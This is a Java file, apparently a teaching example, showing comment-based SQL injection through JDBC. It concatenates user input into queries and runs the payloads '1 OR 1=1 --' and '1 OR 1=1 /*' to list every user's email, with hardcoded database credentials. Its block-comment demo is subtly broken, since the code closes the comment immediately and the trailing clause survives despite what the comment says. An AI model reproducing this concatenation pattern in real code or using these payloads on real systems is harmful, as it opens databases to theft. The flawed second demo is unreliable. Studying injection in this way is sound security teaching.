// Comment-Based SQL Injection via JDBC
// Attacker uses -- or /* */ to comment out the rest of the SQL statement.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class comment_based_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: original query expects a numeric id
        String id = "1 OR 1=1 --"; // comments out any trailing WHERE clauses
        String query = "SELECT * FROM users WHERE id = " + id + " AND active = 1";

        ResultSet rs = st.executeQuery(query);
        while (rs.next()) {
            System.out.println("User: " + rs.getString("email"));
        }

        // Payload using block comment to kill the rest of the query
        String blockId = "1 OR 1=1 /*";
        String blockQuery = "SELECT * FROM users WHERE id = " + blockId + "*/ AND active = 1";
        ResultSet brs = st.executeQuery(blockQuery);

        rs.close();
        st.close();
        con.close();
    }
}
